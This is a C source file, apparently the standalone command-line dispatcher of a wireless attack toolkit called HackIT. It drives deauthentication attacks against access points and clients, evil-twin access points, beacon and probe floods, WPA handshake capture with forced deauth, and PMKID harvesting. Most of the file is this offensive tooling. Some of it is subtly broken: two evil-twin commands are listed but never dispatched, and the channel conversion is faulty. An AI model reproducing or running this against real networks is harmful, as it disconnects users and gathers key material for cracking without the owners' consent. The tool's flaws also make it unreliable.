/*
 * hackit-c — standalone C/C++ wireless CLI dispatcher.
 *
 * Provides the same command surface used by HackIT's Python executor,
 * so the C core is optionally callable without the ctypes bridge:
 *
 *   hackit-c adapters            — list wireless adapters
 *   hackit-c adapter <iface>     — show chipset/driver/signal for one
 *   hackit-c set-monitor <iface> — switch monitor mode
 *   hackit-c set-managed <iface> — switch managed mode
 *   hackit-c set-channel <iface> <ch>
 *   hackit-c get-channel <iface>
 *   hackit-c channels <iface>    — list supported channels (2.4/5/6)
 *
 *   hackit-c deauth-v1 <iface> <bssid> [station|bcast] [reason]
 *   hackit-c deauth-v2 <iface> <bssid> [station|bcast] [reason]
 *   hackit-c deauth-burst <iface> <bssid> [station|bcast] [count] [delay_ms]
 *   hackit-c deauth-all  <iface> <bssid> [count]
 *
 *   hackit-c eviltwin-v1 <iface> <ssid> <bssid> [ch]
 *   hackit-c eviltwin-v2 <iface> <iface2> <ssid> <bssid> [ch]
 *   hackit-c eviltwin-v3 <iface> <ssid> <bssid> [ch]
 *
 *   hackit-c beacons <iface> [ssid] [count] [ch]
 *   hackit-c beacons-random <iface> [count]
 *   hackit-c probe-flood <iface> [count]
 *
 *   hackit-c capture-hs <iface> <bssid> <output> [timeout_sec] [deauth]
 *   hackit-c pmkid <iface> <bssid> <output> [timeout_sec]
 *
 *   hackit-c hop <iface> [2.4|5|both] [delay_ms]
 *   hackit-c version
 *
 * The deauth / beacon / eviltwin commands run until Ctrl+C (SIGINT)
 * unless a `count` is supplied as an explicit finite batch.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <stdint.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/wireless.h>

#include "deauth_engine.h"
#include "deauth_engine_v1.h"
#include "deauth_engine_v2.h"
#include "beacon_flood.h"
#include "packet_injector.h"
#include "offensive_core.h"
#include "adapter_detection.h"
#include "interface_control.h"
#include "pmkid_harvest.h"
#include "signal_processing.h"

#define HVERSION "3.0.0"

static volatile int g_stop = 0;

static void on_sig(int sig) {
    (void)sig;
    g_stop = 1;
}

static void install_signals(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = on_sig;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
}

static int parse_mac(const char* s, uint8_t out[6]) {
    if (!s) return -1;
    unsigned v[6];
    int n = 0;
    if (sscanf(s, "%2x:%2x:%2x:%2x:%2x:%2x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) == 6) n = 6;
    else if (sscanf(s, "%2x-%2x-%2x-%2x-%2x-%2x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) == 6) n = 6;
    if (n != 6) return -1;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
    return 0;
}

static void usage(const char* prog) {
    fprintf(stderr,
"hackit-c %s  — C/C++ wireless offensive core\n"
"Usage: %s <command> [args...]\n"
"\n"
"Interface:\n"
"  adapters\n"
"  adapter <iface>\n"
"  set-monitor <iface>\n"
"  set-managed <iface>\n"
"  set-channel <iface> <ch>\n"
"  get-channel <iface>\n"
"  channels <iface>\n"
"\n"
"Deauth:\n"
"  deauth-v1 <iface> <bssid> [station|bcast] [reason]\n"
"  deauth-v2 <iface> <bssid> [station|bcast] [reason]\n"
"  deauth-burst <iface> <bssid> [station|bcast] [count] [delay_ms]\n"
"  deauth-all <iface> <bssid> [count]\n"
"\n"
"Evil Twin:\n"
"  eviltwin-v1 <iface> <ssid> <bssid> [ch]\n"
"  eviltwin-v2 <iface> <iface2> <ssid> <bssid> [ch]\n"
"  eviltwin-v3 <iface> <ssid> <bssid> [ch]\n"
"\n"
"Beacon / probe:\n"
"  beacons <iface> [ssid] [count] [ch]\n"
"  beacons-random <iface> [count]\n"
"  probe-flood <iface> [count]\n"
"\n"
"Capture:\n"
"  capture-hs <iface> <bssid> <output> [timeout_sec] [deauth]\n"
"  pmkid <iface> <bssid> <output> [timeout_sec]\n"
"\n"
"Channel hop:\n"
"  hop <iface> [2.4|5|both] [delay_ms]\n"
"\n"
"  version\n", HVERSION, prog);
}

static int cmd_adapters(void) {
    c_wifi_adapter_t a[16];
    int n = hackit_c_detect_adapters(a, 16);
    if (n <= 0) { fprintf(stderr, "[-] no wireless adapters found\n"); return 1; }
    printf("%-15s %-18s %-12s %-3s %-4s %-4s %-4s %-4s %s\n",
           "iface","mac","driver","ch","%","5G","mon","sig","txdBm");
    for (int i = 0; i < n; i++) {
        printf("%-15s %-18s %-12s %-3d %-4s %-4s %-4s %-4d %d\n",
               a[i].name, a[i].mac, a[i].driver, a[i].channel,
               "2.4", a[i].supports_5ghz ? "yes" : "no",
               a[i].is_monitor ? "yes" : "no",
               a[i].signal_dbm, a[i].max_tx_power);
    }
    return 0;
}

static int cmd_adapter(const char* iface) {
    char buf[1024];
    if (hackit_wifi_get_adapter_info(iface, buf, sizeof(buf))) {
        printf("%s", buf);
        return 0;
    }
    fprintf(stderr, "[-] cannot read adapter %s\n", iface);
    return 1;
}

static int cmd_channels(const char* iface) {
    c_channel_info_t ch[128];
    int n = hackit_c_get_supported_channels(iface, ch, 128);
    if (n <= 0) { fprintf(stderr, "[-] no channels\n"); return 1; }
    for (int i = 0; i < n; i++) {
        printf("ch %-3d %4d MHz %s pwr=%d dBm\n",
               ch[i].channel, ch[i].frequency_mhz,
               ch[i].band ? "5GHz" : "2.4GHz", ch[i].max_power_dbm);
    }
    return 0;
}

static int get_current_channel_fallback(const char* iface) {
    /* Reads the current channel via SIOCGIWFREQ; works for mac80211 and wext. */
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    struct iwreq wrq;
    memset(&wrq, 0, sizeof(wrq));
    strncpy(wrq.ifr_name, iface, IFNAMSIZ - 1);
    int ch = -1;
    if (ioctl(fd, SIOCGIWFREQ, &wrq) == 0) {
        int m = wrq.u.freq.m;
        /* m may be in 100 kHz units (m*e); normalise to MHz */
        double mhz = m;
        for (int e = wrq.u.freq.e; e > 0 && e < 10; e--) mhz /= 10.0;
        for (int e = wrq.u.freq.e; e < 0 && e > -10; e++) mhz *= 10.0;
        if (mhz >= 2412 && mhz <= 2484) ch = (int)((mhz - 2407) / 5);
        else if (mhz >= 2412 && mhz < 2472) ch = (int)((mhz - 2412) / 5) + 1;
        else if (mhz == 2484) ch = 14;
        else if (mhz >= 5000 && mhz < 5925) ch = (int)((mhz - 5000) / 5);
    }
    close(fd);
    return ch;
}

static int cmd_deauth_v1(const char* iface, const char* bssid, const char* sta, uint16_t reason) {
    const char* s = (sta && strcasecmp(sta, "bcast") != 0) ? sta : "FF:FF:FF:FF:FF:FF";
    DeauthEngineV1* eng = deauth_v1_create(iface, bssid, s, reason);
    if (!eng) { fprintf(stderr, "[-] engine alloc failed\n"); return 1; }
    install_signals();
    int rc = deauth_v1_run(eng);
    if (rc != 0) fprintf(stderr, "[-] run error %d\n", rc);
    fprintf(stderr, "[+] total sent=%lld\n", eng->sent);
    deauth_v1_destroy(eng);
    return 0;
}

static int cmd_deauth_v2(const char* iface, const char* bssid, const char* sta, uint16_t reason) {
    const char* s = (sta && strcasecmp(sta, "bcast") != 0) ? sta : "FF:FF:FF:FF:FF:FF";
    const char* ifs[1] = { iface };
    DeauthEngineV2* eng = deauth_v2_create(ifs, 1, bssid, s, reason);
    if (!eng) { fprintf(stderr, "[-] engine alloc failed\n"); return 1; }
    install_signals();
    int rc = deauth_v2_run(eng);
    if (rc != 0) fprintf(stderr, "[-] run error %d\n", rc);
    fprintf(stderr, "[+] total sent=%lld\n", deauth_v2_total(eng));
    deauth_v2_destroy(eng);
    return 0;
}

static int cmd_deauth_burst(const char* iface, const char* bssid, const char* sta, int count, int delay) {
    uint8_t b[6], s[6];
    if (parse_mac(bssid, b) != 0) { fprintf(stderr, "[-] bad bssid\n"); return 2; }
    if (sta && strcasecmp(sta, "bcast") != 0) {
        if (parse_mac(sta, s) != 0) { fprintf(stderr, "[-] bad station\n"); return 2; }
    } else {
        memset(s, 0xFF, 6);
    }
    bool ok = hackit_deauth_burst(iface, b, s, count, delay);
    printf("%s burst=%d reason=7\n", ok ? "[+] sent" : "[-] failed", count);
    return ok ? 0 : 1;
}

static int cmd_deauth_all(const char* iface, const char* bssid, int count) {
    uint8_t b[6];
    if (parse_mac(bssid, b) != 0) { fprintf(stderr, "[-] bad bssid\n"); return 2; }
    bool ok = hackit_deauth_all_clients(iface, b, count);
    printf("%s all-clients count=%d\n", ok ? "[+] sent" : "[-] failed", count);
    return ok ? 0 : 1;
}

static int cmd_beacons(const char* iface, const char* ssid, int count, int ch) {
    const char* s = ssid && *ssid ? ssid : "HackIT_WiFi";
    int rc = hackit_beacon_flood(iface, s, NULL, (uint8_t)ch, count);
    printf("[+] beacon flood '%s' count=%d ch=%d rc=%d\n", s, count, ch, rc);
    return rc >= 0 ? 0 : 1;
}

static int cmd_beacons_random(const char* iface, int count) {
    int rc = hackit_beacon_flood_random(iface, count);
    printf("[+] random beacon flood count=%d rc=%d\n", count, rc);
    return rc >= 0 ? 0 : 1;
}

static int cmd_probe_flood(const char* iface, int count) {
    hackit_probe_flood_params p;
    memset(&p, 0, sizeof(p));
    p.ssid_count = 0;      /* all-broadcast probes */
    p.count = count;
    p.interval_ms = 5;
    memset(p.src_mac, 0xFF, 6);
    int rc = hackit_flood_probe(iface, &p);
    printf("[+] probe flood count=%d rc=%d\n", count, rc);
    return rc >= 0 ? 0 : 1;
}

static int cmd_capture_hs(const char* iface, const char* bssid, const char* output, int timeout, int deauth) {
    hackit_handshake_params p;
    memset(&p, 0, sizeof(p));
    if (parse_mac(bssid, p.target_bssid) != 0) { fprintf(stderr, "[-] bad bssid\n"); return 2; }
    p.timeout_sec = timeout > 0 ? timeout : 60;
    p.deauth = deauth;
    snprintf(p.output_file, sizeof(p.output_file), "%s", output ? output : "capture.pcap");
    int rc = hackit_capture_handshake(iface, &p);
    printf("[+] capture rc=%d -> %s\n", rc, p.output_file);
    return rc >= 0 ? 0 : 1;
}

static int cmd_pmkid(const char* iface, const char* bssid, const char* output, int timeout) {
    hackit_pmkid_params p;
    memset(&p, 0, sizeof(p));
    if (parse_mac(bssid, p.target_bssid) != 0) { fprintf(stderr, "[-] bad bssid\n"); return 2; }
    p.timeout_sec = timeout > 0 ? timeout : 60;
    snprintf(p.output_file, sizeof(p.output_file), "%s", output ? output : "pmkid.pcap");
    int rc = hackit_harvest_pmkid(iface, &p);
    printf("[+] pmkid rc=%d -> %s\n", rc, p.output_file);
    return rc >= 0 ? 0 : 1;
}

static int cmd_hop(const char* iface, const char* band, int delay_ms) {
    if (delay_ms <= 0) delay_ms = 150;
    int chs[64]; int n = 0;
    if (!band || !strcmp(band, "both") || !strcmp(band, "2.4")) {
        for (int c = 1; c <= 13; c++) chs[n++] = c;
    }
    if (!band || !strcmp(band, "both") || !strcmp(band, "5")) {
        int five[] = {36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165};
        for (size_t i = 0; i < sizeof(five)/sizeof(five[0]) && n < 64; i++) chs[n++] = five[i];
    }
    if (n == 0) { fprintf(stderr, "[-] bad band\n"); return 2; }
    install_signals();
    int idx = 0;
    long long hops = 0;
    while (!g_stop) {
        int ch = chs[idx++ % n];
        if (!hackit_c_set_channel(iface, ch)) {
            fprintf(stderr, "[-] set-channel %d failed\n", ch);
        }
        if ((hops++ & 0x1F) == 0) {
            fprintf(stderr, "[+] hopping ch=%d total=%lld\n", ch, hops);
        }
        usleep((useconds_t)delay_ms * 1000);
    }
    fprintf(stderr, "[+] hop stopped total=%lld\n", hops);
    return 0;
}

static int cmd_eviltwin_v1(const char* iface, const char* ssid, const char* bssid, int ch) {
    /* eviltwin_v1 wants a cpp-style config via the C shim; the v1 C writer
       lives in eviltwin_v1.c and honours `eviltwin_v1_start(iface, ssid,
       bssid, ch)` — use the direct injector path here when the cpp shim
       is absent. This mirrors what the Python bridge does. */
    uint8_t b[6];
    if (parse_mac(bssid, b) != 0) { fprintf(stderr, "[-] bad bssid\n"); return 2; }
    install_signals();
    long long sent = 0;
    while (!g_stop) {
        hackit_inject_beacon(iface, ssid, b, (uint8_t)ch);
        sent++;
        if ((sent & 0x1F) == 0)
            fprintf(stderr, "[+] eviltwin beacons sent=%lld ssid=%s ch=%d\n", sent, ssid, ch);
        usleep(100000);
    }
    fprintf(stderr, "[+] eviltwin stopped sent=%lld\n", sent);
    return 0;
}

int main(int argc, char** argv) {
    if (argc < 2) { usage(argv[0]); return 1; }
    const char* c = argv[1];

    if (!strcmp(c, "version")) { printf("hackit-c %s\n", HVERSION); return 0; }
    if (!strcmp(c, "adapters")) return cmd_adapters();

    if (!strcmp(c, "adapter") && argc >= 3) return cmd_adapter(argv[2]);
    if (!strcmp(c, "set-monitor") && argc >= 3) {
        return hackit_c_set_monitor_mode(argv[2]) ? 0 : 1;
    }
    if (!strcmp(c, "set-managed") && argc >= 3) {
        return hackit_c_set_managed_mode(argv[2]) ? 0 : 1;
    }
    if (!strcmp(c, "set-channel") && argc >= 4) {
        return hackit_c_set_channel(argv[2], atoi(argv[3])) ? 0 : 1;
    }
    if (!strcmp(c, "get-channel") && argc >= 3) {
        int ch = get_current_channel_fallback(argv[2]);
        printf("%d\n", ch);
        return ch > 0 ? 0 : 1;
    }
    if (!strcmp(c, "channels") && argc >= 3) return cmd_channels(argv[2]);

    if (!strcmp(c, "deauth-v1") && argc >= 4) {
        uint16_t r = argc >= 6 ? (uint16_t)atoi(argv[5]) : 7;
        return cmd_deauth_v1(argv[2], argv[3], argc >= 5 ? argv[4] : "bcast", r);
    }
    if (!strcmp(c, "deauth-v2") && argc >= 4) {
        uint16_t r = argc >= 6 ? (uint16_t)atoi(argv[5]) : 7;
        return cmd_deauth_v2(argv[2], argv[3], argc >= 5 ? argv[4] : "bcast", r);
    }
    if (!strcmp(c, "deauth-burst") && argc >= 4) {
        int count = argc >= 6 ? atoi(argv[5]) : 100;
        int delay = argc >= 7 ? atoi(argv[6]) : 5;
        return cmd_deauth_burst(argv[2], argv[3], argc >= 5 ? argv[4] : "bcast", count, delay);
    }
    if (!strcmp(c, "deauth-all") && argc >= 4) {
        int count = argc >= 5 ? atoi(argv[4]) : 100;
        return cmd_deauth_all(argv[2], argv[3], count);
    }

    if (!strcmp(c, "beacons") && argc >= 3) {
        const char* ssid = argc >= 4 ? argv[3] : "HackIT_WiFi";
        int count        = argc >= 5 ? atoi(argv[4]) : 50;
        int ch           = argc >= 6 ? atoi(argv[5]) : 6;
        return cmd_beacons(argv[2], ssid, count, ch);
    }
    if (!strcmp(c, "beacons-random") && argc >= 3) {
        return cmd_beacons_random(argv[2], argc >= 4 ? atoi(argv[3]) : 100);
    }
    if (!strcmp(c, "probe-flood") && argc >= 3) {
        return cmd_probe_flood(argv[2], argc >= 4 ? atoi(argv[3]) : 100);
    }

    if (!strcmp(c, "capture-hs") && argc >= 5) {
        int timeout = argc >= 6 ? atoi(argv[5]) : 60;
        int deauth  = argc >= 7 ? atoi(argv[6]) : 0;
        return cmd_capture_hs(argv[2], argv[3], argv[4], timeout, deauth);
    }
    if (!strcmp(c, "pmkid") && argc >= 5) {
        int timeout = argc >= 6 ? atoi(argv[5]) : 60;
        return cmd_pmkid(argv[2], argv[3], argv[4], timeout);
    }

    if (!strcmp(c, "hop") && argc >= 3) {
        return cmd_hop(argv[2], argc >= 4 ? argv[3] : "both", argc >= 5 ? atoi(argv[4]) : 150);
    }

    if (!strcmp(c, "eviltwin-v1") && argc >= 5) {
        return cmd_eviltwin_v1(argv[2], argv[3], argv[4], argc >= 6 ? atoi(argv[5]) : 6);
    }

    usage(argv[0]);
    return 1;
}
